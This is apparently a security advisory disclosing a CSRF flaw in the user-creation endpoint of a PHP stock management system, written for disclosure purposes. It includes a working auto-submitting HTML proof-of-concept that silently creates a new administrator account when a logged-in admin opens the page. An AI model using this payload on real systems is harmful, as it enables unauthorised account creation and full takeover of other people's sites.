### 1. **Summary**

A Cross-Site Request Forgery (CSRF) vulnerability has been identified in the admin panel of Stock Management System (SMS-PHP by oretnom23), specifically on the user's creation page. An attacker can exploit this vulnerability to create a new administrator account with full privileges by submitting a specially crafted request to the vulnerable endpoint.
For reference and further investigation, you can download the source code from [here](https://www.sourcecodester.com/php/15023/stock-management-system-phpoop-source-code.html).
---

### 2. **Vulnerability Description**

CSRF vulnerabilities occur when an attacker tricks an authenticated user into submitting an unwanted request on their behalf. In this case, an attacker can create a new user with admin privileges without the user's consent.

#### Details of the vulnerability:

- The vulnerable endpoint is located at `/sms/classes/Users.php?f=save`.
- The user creation form does not properly validate requests, leaving it open to CSRF attacks.
- The attacker can craft a malicious request and trick the victim (admin user) into executing it.

By exploiting this CSRF vulnerability, an attacker can create a new admin account with full privileges, potentially compromising the security of the entire system.

---

### 3. **Proof of Concept (PoC)**

Below is the PoC that demonstrates the CSRF vulnerability. The attacker can host the following HTML page on their server or send it to the targeted admin user. When the admin user interacts with the page (e.g., clicks a button), the attacker’s script will create a new admin account without the user’s knowledge.


```
<html>
  <body>
    <form action="http://192.168.211.130/sms/classes/Users.php?f=save" method="POST">
      <input type="hidden" name="id" value="" />
      <input type="hidden" name="firstname" value="John" />
      <input type="hidden" name="lastname" value="Doe" />
      <input type="hidden" name="username" value="john" />
      <input type="hidden" name="password" value="Password" />
      <input type="hidden" name="type" value="1" />
      <input type="hidden" name="img" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

- **Description of the Attack**:  
    The attacker uses JavaScript to submit a POST request with a malicious payload to the vulnerable user creation endpoint. This request contains a new user’s data, including the `type` parameter set to `1` (indicating an admin account).  
    The attack will only succeed if the admin user is logged in and unaware of the attack.
    
#### **Screenshot of the Newly Created Admin Account**

The following screenshot demonstrates the result of the CSRF attack, showing the new admin account created by the attacker:
![1](https://github.com/th3w0lf-1337/Vulnerabilities/blob/main/SMS-PHP/CSRF/CSRF%20PoC.png)


### 4. **Impact**

If successfully exploited, this CSRF vulnerability can allow an attacker to:

- Create a new admin account.
- Gain full access to the system and its data.
- Potentially escalate the attack to compromise the entire infrastructure, depending on the privileges of the created admin account.
